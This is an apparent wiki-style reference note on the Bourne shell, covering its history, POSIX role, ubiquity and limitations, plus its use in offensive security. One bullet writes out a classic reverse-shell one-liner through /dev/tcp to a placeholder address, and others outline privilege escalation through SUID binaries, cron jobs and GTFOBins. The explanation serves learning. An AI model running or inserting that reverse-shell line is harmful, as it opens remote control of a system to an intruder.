# Bourne Shell (sh)

The Bourne Shell is the original Unix shell, written by Stephen Bourne and released with Unix Version 7 in 1979. It established the foundational syntax and behavior that all subsequent shells have built upon. While largely superseded by modern shells like bash and zsh for interactive use, sh remains universally present on Unix and Linux systems and is the basis for POSIX shell standards.

- **POSIX standard:** sh defines the baseline for POSIX shell compliance. Scripts written to the POSIX sh standard are portable across virtually every Unix-like system, making sh the lowest common denominator for cross-platform scripting.
- **Ubiquity:** `/bin/sh` is present on every Unix and Linux system without exception. On modern systems it is typically a symlink to a faster, lighter shell running in POSIX compatibility mode — dash on Debian/Ubuntu systems, bash in compatibility mode on others.
- **Syntax foundation:** Core shell constructs — pipelines, redirection, conditionals, loops, functions, and variable expansion — originate from sh. All modern shells inherit this syntax, meaning understanding sh is understanding the foundation of all shell scripting.
- **System and boot scripts:** Init systems, boot scripts, package manager hooks, and other low-level system scripts commonly use `#!/bin/sh` to ensure compatibility regardless of what other shells are installed on the system. This makes sh behavior relevant whenever interacting with system internals.
- **Limitations:** sh lacks many conveniences of modern shells — no arrays, no double bracket conditionals, limited string manipulation, no associative maps, and minimal interactive features. It is a scripting tool rather than a comfortable interactive environment.
- **Offensive relevance:** sh is a primary target for reverse shells and post-exploitation payloads precisely because of its ubiquity. When landing on an unknown system, an attacker cannot assume bash, zsh, or any other shell is available — but `/bin/sh` is always there. The classic reverse shell payload `sh -i >& /dev/tcp/10.0.0.1/4444 0>&1` targets sh for this reason.
- **Privilege escalation:** SUID binaries, cron jobs, and system scripts that invoke sh are common privilege escalation vectors. Because sh is often used in system-level contexts running as root, any writable script or injection point that feeds into sh can lead to full privilege escalation.
- **GTFOBins:** sh appears extensively in GTFOBins — the reference for abusing Unix binaries for privilege escalation and security bypasses. If an attacker can invoke sh through a SUID binary or sudo misconfiguration, it trivially provides a root shell.

Despite its age, sh remains one of the most security-relevant binaries on any Unix system. Its universal presence and frequent use in privileged contexts make it a consistent target and tool in offensive security.

---

See also:

- [[bourne_again_shell_(bash).md]]
- [[reverse_shell]]
- [[privilege_escalation]]
- [[gtfobins]]
